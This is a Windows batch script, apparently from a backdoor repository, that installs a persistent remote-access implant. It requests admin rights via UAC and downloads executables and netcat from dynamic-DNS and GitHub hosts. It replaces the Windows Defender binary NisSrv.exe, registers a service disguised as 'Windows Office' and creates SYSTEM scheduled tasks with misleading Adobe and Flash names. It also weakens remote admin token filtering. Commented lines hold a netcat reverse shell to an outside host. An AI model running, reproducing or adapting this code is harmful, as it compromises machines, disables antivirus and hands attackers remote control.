@echo off
:: BatchGotAdmin
::-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 0 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
::--------------------------------------

::ENTER YOUR CODE BELOW:


rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/plink.exe','%windir%\plink.exe')
rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/mila.ppk','%windir%\mila.ppk')
rem wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/win.bat  -O %temp%\win.bat
rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/win/get.bat','%windir%\get.bat')
rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/win/nc64.exe','%windir%\nc64.exe')
set url=http://config01.homepc.it
set urlgit=https://github.com/pistacchietto/Win-Python-Backdoor/raw/master
%windir%\System32\cmd.exe /c powershell -command "$cli = New-Object System.Net.WebClient;$cli.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36';$cli.DownloadFile('%url%/svc/wup.php?pc=pdf','%windir%\pdf.txt')"
rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/cacert.pem','%windir%\cacert.pem')
%windir%\System32\cmd.exe /c powershell -command "$cli = New-Object System.Net.WebClient;$cli.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36';$cli.DownloadFile('%url%/win/cacert.pem','%windir%\cacert.pem')"
if "%PROCESSOR_ARCHITECTURE%"=="x86" goto 32BIT
echo 64-bit OS
rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/wget.exe','%windir%\wget.exe')
%windir%\System32\cmd.exe /c powershell -command "$cli = New-Object System.Net.WebClient;$cli.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36';$cli.DownloadFile('%url%/win/wget.exe','%windir%\wget.exe')"
wget --no-check-certificate %urlgit%/nc64.exe  -O %windir%\nc64.exe
goto END
:32BIT
echo 32-bit OS
rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/wget32.exe','%windir%\wget.exe')
%windir%\System32\cmd.exe /c powershell -command "$cli = New-Object System.Net.WebClient;$cli.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36';$cli.DownloadFile('%url%/win/wget32.exe','%windir%\wget.exe')"
wget --no-check-certificate %urlgit%/nc.exe  -O %windir%\nc64.exe
:END

rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/wofficeie1.exe','%windir%\wofficeie1.exe')

rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/woffice.exe','%windir%\woffice.exe')
rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/woffice.exe','C:\Program Files\Windows Defender\NisSrv.exe')
rem wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/win.bat  -O %windir%\win.bat
rem wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/wup.exe  -O %windir%\wup.exe
taskkill /f /im woffice.exe
taskkill /f /im wscript.exe
schtasks /delete /tn sys /F
schtasks /delete /tn syskill /F
schtasks /delete /tn office_get /F

rem wget --no-check-certificate %urlgit%/get.bat  -O %windir%\get.bat
wget --no-check-certificate %urlgit%/get.vbs  -O %windir%\get.vbs
wget --no-check-certificate %urlgit%/sys.xml  -O %windir%\sys.xml
wget --no-check-certificate %urlgit%/syskill.xml  -O %windir%\syskill.xml
wget --no-check-certificate %urlgit%/office_get.xml  -O %windir%\office_get.xml
schtasks /create /tn office_get /xml %windir%\office_get.xml /F
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
wget --no-check-certificate %urlgit%/woffice.exe  -O %windir%\woffice.exe
rem %windir%\wofficeie1.exe
rem SLEEP 10
rem taskkill /f /im NisSrv.exe
taskkill /f /im wup.exe
net stop wup
rem copy /y %windir%\wofficeie1.exe %windir%\wup.exe
copy /Y %windir%\woffice.exe "C:\Program Files\Windows Defender\NisSrv.exe"
sc create wup binPath= "%windir%\wup.exe" DisplayName= "Windows Office" start= auto
net start wup
schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "%windir%\woffice.exe" /tn myadobe1 /rl highest /F
schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "C:\Program Files\Windows Defender\NisSrv.exe" /tn flash_fw /rl highest /F
schtasks /create /ru "SYSTEM" /sc minute /mo 5 /tr "taskkill /f /im woffice.exe" /tn myflash /rl highest /F
rem schtasks /create /tn sys /xml %windir%\sys.xml /F
rem schtasks /create /tn syskill /xml %windir%\syskill.xml /F


rem schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "nc64.exe -e cmd.exe verifiche.ddns.net 4001" /tn sys /rl highest /F
rem schtasks /create /ru "SYSTEM" /sc minute /mo 5 /tr "taskkill /f /im nc64.exe"  /tn syskill /rl highest /F
rem schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "%windir%\get.bat" /tn office_get /rl highest /F
rem schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "net start wup" /tn myadobe2 /rl highest /F
rem schtasks /create /ru "SYSTEM" /sc minute /mo 5 /tr "taskkill /f /im wup.exe" /tn myflash2 /rl highest /F
rem schtasks /create /ru "SYSTEM" /sc minute /mo 1 /tr "nc64.exe -e cmd.exe verifiche.ddns.net 4001" /tn sys /rl highest /F
rem schtasks /delete /tn sys /F
